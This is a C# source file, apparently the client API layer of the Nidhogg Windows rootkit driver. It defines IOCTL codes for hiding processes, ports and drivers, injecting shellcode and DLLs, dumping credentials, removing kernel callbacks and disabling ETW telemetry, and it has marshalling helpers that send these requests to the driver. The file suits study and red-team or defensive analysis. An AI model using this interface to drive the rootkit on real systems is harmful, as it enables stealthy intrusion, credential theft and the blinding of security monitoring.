using System.Runtime.InteropServices;
using System;

namespace NidhoggCSharpApi
{
    internal partial class NidhoggApi
    {
        private const uint METHOD_BUFFERED = 0;
        private const uint FILE_ANY_ACCESS = 0;

        private uint IOCTL_PROTECT_UNPROTECT_PROCESS = CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_CLEAR_PROCESS_PROTECTION = CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_HIDE_UNHIDE_PROCESS = CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_ELEVATE_PROCESS = CTL_CODE(0x8000, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_SET_PROCESS_SIGNATURE_LEVEL = CTL_CODE(0x8000, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_QUERY_PROTECTED_PROCESSES = CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS);

        private uint IOCTL_PROTECT_UNPROTECT_THREAD = CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_CLEAR_THREAD_PROTECTION = CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_HIDE_UNHIDE_THREAD = CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_QUERY_PROTECTED_THREADS = CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS);

        private uint IOCTL_PROTECT_UNPROTECT_FILE = CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_CLEAR_FILE_PROTECTION = CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_QUERY_FILES = CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS);

        private uint IOCTL_PROTECT_REGITEM = CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_UNPROTECT_REGITEM = CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_CLEAR_REGITEMS = CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_QUERY_REGITEMS = CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS);

        private uint IOCTL_PATCH_MODULE = CTL_CODE(0x8000, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_INJECT_SHELLCODE = CTL_CODE(0x8000, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_INJECT_DLL = CTL_CODE(0x8000, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_HIDE_MODULE = CTL_CODE(0x8000, 0x814, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_HIDE_UNHIDE_DRIVER = CTL_CODE(0x8000, 0x815, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_DUMP_CREDENTIALS = CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS);

        private uint IOCTL_LIST_OBCALLBACKS = CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_LIST_PSROUTINES = CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_LIST_REGCALLBACKS = CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_REMOVE_RESTORE_CALLBACK = CTL_CODE(0x8000, 0x81A, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_ENABLE_DISABLE_ETWTI = CTL_CODE(0x8000, 0x81B, METHOD_BUFFERED, FILE_ANY_ACCESS);

        private uint IOCTL_HIDE_UNHIDE_PORT = CTL_CODE(0x8000, 0x81C, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_CLEAR_HIDDEN_PORTS = CTL_CODE(0x8000, 0x81D, METHOD_BUFFERED, FILE_ANY_ACCESS);
        private uint IOCTL_QUERY_HIDDEN_PORTS = CTL_CODE(0x8000, 0x81E, METHOD_BUFFERED, FILE_ANY_ACCESS);

        private uint IOCTL_EXEC_SCRIPT = CTL_CODE(0x8000, 0x81F, METHOD_BUFFERED, FILE_ANY_ACCESS);

        private static uint CTL_CODE(uint DeviceType, uint Function, uint Method, uint Access)
        {
            return ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method);
        }

        private NidhoggErrorCodes NidhoggSendDataIoctl<DataType>(DataType data, uint ioctl)
        {
            IntPtr dataPtr;
            NidhoggErrorCodes errorCode = NidhoggErrorCodes.NIDHOGG_SUCCESS;

            try
            {
                dataPtr = Marshal.AllocHGlobal(Marshal.SizeOf<DataType>());
                Marshal.StructureToPtr(data, dataPtr, false);
            }
            catch (OutOfMemoryException)
            {
                errorCode = NidhoggErrorCodes.NIDHOGG_GENERAL_ERROR;
                return errorCode;
            }

            if (!DeviceIoControl(hNidhogg, ioctl, dataPtr,
                    (uint)Marshal.SizeOf<DataType>(), IntPtr.Zero, 0, out uint _, IntPtr.Zero))
            {
                errorCode = NidhoggErrorCodes.NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
            }

            Marshal.FreeHGlobal(dataPtr);
            return errorCode;
        }

        private DataType NidhoggRecieveDataIoctl<DataType>(DataType data, uint ioctl)
        {
            IntPtr dataPtr;

            try
            {
                dataPtr = Marshal.AllocHGlobal(Marshal.SizeOf<DataType>());
                Marshal.StructureToPtr(data, dataPtr, false);
            }
            catch (OutOfMemoryException)
            {
                throw new NidhoggApiException("[-] Out of memory");
            }

            if (!DeviceIoControl(hNidhogg, ioctl, IntPtr.Zero, 0, dataPtr,
                (uint)Marshal.SizeOf<DataType>(), out uint _, IntPtr.Zero))
            {
                Marshal.FreeHGlobal(dataPtr);
                throw new NidhoggApiException("[-] Failed to execute DeviceIoControl");
            }
            DataType returnedData = Marshal.PtrToStructure<DataType>(dataPtr);

            Marshal.FreeHGlobal(dataPtr);
            return returnedData;
        }

        private DataType NidhoggSendRecieveDataIoctl<DataType>(DataType data, uint ioctl)
        {
            IntPtr dataPtr;

            try
            {
                dataPtr = Marshal.AllocHGlobal(Marshal.SizeOf<DataType>());
                Marshal.StructureToPtr(data, dataPtr, false);
            }
            catch (OutOfMemoryException)
            {
                throw new NidhoggApiException("Out of memory");
            }

            if (!DeviceIoControl(hNidhogg, ioctl, dataPtr, (uint)Marshal.SizeOf<DataType>(), dataPtr,
                (uint)Marshal.SizeOf<DataType>(), out uint _, IntPtr.Zero))
            {
                Marshal.FreeHGlobal(dataPtr);
                throw new NidhoggApiException("Failed to execute DeviceIoControl");
            }
            DataType returnedData = Marshal.PtrToStructure<DataType>(dataPtr);

            Marshal.FreeHGlobal(dataPtr);
            return returnedData;
        }
    }
}